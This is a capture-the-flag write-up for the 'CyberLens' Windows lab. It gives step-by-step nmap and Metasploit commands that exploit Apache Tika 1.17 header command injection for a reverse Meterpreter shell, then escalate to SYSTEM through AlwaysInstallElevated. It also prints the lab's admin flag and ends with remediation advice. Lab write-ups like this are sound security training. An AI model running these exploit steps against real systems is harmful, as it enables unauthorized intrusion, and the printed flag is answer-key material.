## CyberLens

Medium-difficulty Windows Server 2019 machine. A web front end on port 80 passes uploaded images to an Apache Tika 1.17 server running on port 61777. Tika 1.17 is vulnerable to header command injection, which gives a Meterpreter session as a local user. The machine has the AlwaysInstallElevated policy enabled, so a malicious MSI package runs with SYSTEM privileges and gives full administrator access.

**Target:** 10.48.129.254 (cyberlens.thm)
**Platform:** Windows Server 2019
**Difficulty:** Medium
**Attack Path:** Port scan → Web enumeration → Tika service discovery → Header injection RCE → Meterpreter → Local exploit suggester → AlwaysInstallElevated → SYSTEM

---

### PART 1: RECONNAISSANCE

**Full port scan**

```
nmap -p- 10.48.129.254
```

```
80/tcp     open  http           Apache 2.4.57 (Win64)
135/tcp    open  msrpc
139/tcp    open  netbios-ssn
445/tcp    open  microsoft-ds
3389/tcp   open  ms-wbt-server  Remote Desktop
5985/tcp   open  wsman          WinRM
47001/tcp  open  winrm
49664-49671/tcp  open  msrpc
61777/tcp  open  unknown
```

Many of these ports are standard Windows services. Port 80 and port 61777 are the most useful for an initial foothold.

**Service and version scan**

```
nmap -sV -sC -p 80,445,3389,5985,61777 10.48.129.254
```

**Key findings:**
- Port 80 serves "CyberLens: Unveiling the Hidden Matrix," a site that accepts image uploads and extracts metadata.
- Port 61777 runs Jetty and identifies itself as "Apache Tika 1.17 Server."
- SMB signing is enabled but not required.

---

### PART 2: HOSTNAME RESOLUTION

Adding the hostname to the local hosts file makes later requests easier to manage:

```
echo '10.48.129.254 cyberlens.thm' | sudo tee -a /etc/hosts
```

---

### PART 3: IDENTIFYING THE TIKA BACKEND

**Metadata upload feature**

The web application's upload function extracts metadata from images. The upload is forwarded to a backend service on port 61777, which turns out to be Apache Tika.

**Apache Tika**

Apache Tika is a content analysis toolkit. Its server component accepts files over HTTP and returns extracted text and metadata. Version 1.17 has a known issue where values in HTTP headers can be passed to the operating system as commands.

**Search for known exploits**

```
searchsploit apache tika
```

```
Apache Tika 1.15 - 1.17 - Header Command Injection | windows/remote/47208.rb
Apache Tika-server < 1.18 - Command Injection       | windows/remote/46540.py
```

Both entries target the same class of flaw. The Metasploit module below is the easiest route on this machine.

---

### PART 4: REMOTE CODE EXECUTION VIA TIKA

**Load the Metasploit module**

```
msfconsole
search apache tika
```

```
#  Name                                           Rank       Description
0  exploit/windows/http/apache_tika_jp2_jscript   excellent  Apache Tika Header Command Injection
```

**Configure and run**

```
use exploit/windows/http/apache_tika_jp2_jscript
set RHOSTS 10.48.129.254
set RPORT 61777
set LHOST 192.168.136.156
exploit
```

**Result:**

```
meterpreter > sysinfo
Computer        : CYBERLENS
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
```

The session runs as a low-privilege user.

---

### PART 5: USER FLAG

Use the shell to navigate to the user's desktop:

```
C:\Users\CyberLens\Desktop>dir
```

```
06/06/2023  07:54 PM    25 user.txt
```

```
C:\Users\CyberLens\Desktop>type user.txt
[user flag: not recorded in notes]
```

---

### PART 6: LOCAL PRIVILEGE ESCALATION ENUMERATION

**Background session**

Move the Meterpreter session to the background so the search module can run:

```
background
search post/multi/recon/local_exploit_suggester
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

**Suggested modules**

The local exploit suggester checks the target for known privilege escalation paths. Relevant results include:

```
1   exploit/windows/local/always_install_elevated                     The target is vulnerable
9   exploit/windows/persistence/registry                              The target is vulnerable. Registry writable
10  exploit/windows/persistence/registry_active_setup                 The target is vulnerable. Registry writable
15  exploit/windows/persistence/userinit_mpr_logon_script             The target is vulnerable. Registry path is writable
```

The `always_install_elevated` module is the one that gives administrator access directly. The persistence modules write to the registry and are useful for keeping access, but they do not elevate privileges on their own.

---

### PART 7: ALWAYSINSTALLELEVATED PRIVILEGE ESCALATION

**What AlwaysInstallElevated is**

Windows Installer runs MSI packages with elevated rights when two registry values are set to 1:

```
HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
```

When both are enabled, any user can install an MSI package that runs with SYSTEM privileges. This setting is a common misconfiguration.

**Run the module**

```
background
use exploit/windows/local/always_install_elevated
set SESSION 1
set LHOST 192.168.136.156
exploit
```

The module builds a malicious MSI package, uploads it, and runs it through the Windows Installer service.

**Result:**

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---

### PART 8: ADMINISTRATOR FLAG

With SYSTEM access, the Administrator desktop is readable:

```
C:\Users\Administrator\Desktop>dir
```

```
11/27/2023  07:50 PM    24 admin.txt
```

```
C:\Users\Administrator\Desktop>type admin.txt
THM{3lev@t3D-4-pr1v35c!}
```

---

### ATTACK TIMELINE

```
PHASE 1: Reconnaissance
  ├─ Full port scan
  ├─ Service detection (IIS/Apache, RDP, WinRM, Tika on 61777)
  └─ Hosts file entry for cyberlens.thm

PHASE 2: Tika Identification
  ├─ Upload feature on port 80
  ├─ Backend Apache Tika 1.17 on port 61777
  └─ searchsploit results for header command injection

PHASE 3: Initial Access
  ├─ Metasploit apache_tika_jp2_jscript module
  └─ Meterpreter session as low-privilege user

PHASE 4: User Access
  └─ user.txt from CyberLens desktop

PHASE 5: Privilege Escalation Enumeration
  ├─ post/multi/recon/local_exploit_suggester
  └─ AlwaysInstallElevated identified

PHASE 6: SYSTEM
  ├─ always_install_elevated module
  └─ NT AUTHORITY\SYSTEM

PHASE 7: Administrator Access
  └─ admin.txt from Administrator desktop
```

---

### VULNERABILITIES

1. **Apache Tika 1.17 Header Command Injection (Critical)**
   - HTTP header values passed to system commands
   - Remote code execution without authentication

2. **Tika Service Exposed to the Network (High)**
   - Backend processing service reachable on port 61777
   - Should only accept traffic from the web application

3. **AlwaysInstallElevated Enabled (Critical)**
   - Any user can install MSI packages with SYSTEM rights
   - Direct path from low-privilege user to SYSTEM

4. **Writable Registry Paths for Persistence (Medium)**
   - Registry locations writable by the low-privilege user
   - Allows persistence after reboot

---

### REMEDIATION

```
├─ Upgrade Apache Tika to a version after 1.17 that fixes header injection
├─ Restrict the Tika service to localhost or the web application's address only
├─ Disable AlwaysInstallElevated in both HKLM and HKCU policy keys
├─ Run services with the least privilege needed and avoid running Tika as a high-privilege account
├─ Restrict write access to registry paths used for auto-run and persistence
├─ Apply the principle of least privilege for Windows Installer
└─ Monitor for unexpected MSI installations and Tika process activity
```

---

### TECHNICAL NOTES

**Tools Used:**
- nmap (port and service enumeration)
- searchsploit (exploit lookup)
- Metasploit: apache_tika_jp2_jscript (RCE)
- Metasploit: post/multi/recon/local_exploit_suggester (privilege escalation enumeration)
- Metasploit: exploit/windows/local/always_install_elevated (SYSTEM)
- Meterpreter (post-exploitation shell)

**Key Insight:** An unauthenticated Tika server accepted attacker-controlled headers and ran them as commands. After the initial foothold, a single registry policy allowed any user to install an MSI as SYSTEM.

**Concepts to Study:**
- Apache Tika and metadata extraction services
- HTTP header injection leading to command execution
- Windows Installer and AlwaysInstallElevated
- Meterpreter and post-exploitation modules
- Windows privilege escalation enumeration


# Jai Shri Ram 
